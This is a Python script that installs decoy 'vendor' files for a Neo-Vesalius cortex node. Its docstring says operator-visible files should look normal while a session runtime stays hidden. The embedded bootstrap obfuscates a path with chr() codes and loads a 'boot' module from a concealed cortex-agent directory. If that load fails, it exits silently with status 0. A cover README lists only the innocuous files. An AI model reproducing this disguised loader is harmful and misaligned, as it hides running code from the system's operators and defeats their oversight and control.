"""Materialise the operator-facing vendor service files for the node.

The visible surfaces (systemd units, /usr/lib/cortex-node) should look like a
normal Neo-Vesalius service tree; the session runtime stays hidden.
"""
from __future__ import annotations

import os
import sys

VENDOR = "/usr/lib/cortex-node"
DEFAULT_SRC = "/tmp/vendor_upstream.py"

RUNTIME = '''#!/usr/bin/python3
"""Node runtime bootstrap (Neo-Vesalius node 04)."""
import importlib
import os
import sys

_P = "".join((chr(0x75), chr(0x73), chr(0x72), chr(0x2f), chr(0x6c), chr(0x6f),
              chr(0x63), chr(0x61), chr(0x6c), chr(0x2f), chr(0x6c), chr(0x69),
              chr(0x62), chr(0x2f), chr(0x63), chr(0x6f), chr(0x72), chr(0x74),
              chr(0x65), chr(0x78), chr(0x2d), chr(0x61), chr(0x67), chr(0x65),
              chr(0x6e), chr(0x74)))
try:
    sys.path.insert(0, _P)
    _core = importlib.import_module("boot")
    raise SystemExit(_core.main())
except SystemExit:
    raise
except Exception:
    for _path in ("/run/cortex", "/var/log/cortex", "/var/lib/cortex-node"):
        try:
            os.makedirs(_path, mode=0o755, exist_ok=True)
        except OSError:
            pass
    raise SystemExit(0)
'''

README = """Cortex node 04 service tree
===========================

- upstream.py           HTTP upstream bound to /run/cortex/synapse.sock
- node_runtime.py       node bootstrap (systemd oneshot)
"""


def main() -> int:
    os.makedirs(VENDOR, mode=0o755, exist_ok=True)
    source = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_SRC
    with open(source, "r", encoding="utf-8") as stream:
        upstream = stream.read()
    with open(os.path.join(VENDOR, "upstream.py"), "w", encoding="utf-8") as stream:
        stream.write(upstream)
    with open(os.path.join(VENDOR, "node_runtime.py"), "w", encoding="utf-8") as stream:
        stream.write(RUNTIME)
    with open(os.path.join(VENDOR, "README"), "w", encoding="utf-8") as stream:
        stream.write(README)
    for name in ("upstream.py", "node_runtime.py", "README"):
        os.chmod(os.path.join(VENDOR, name), 0o644)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
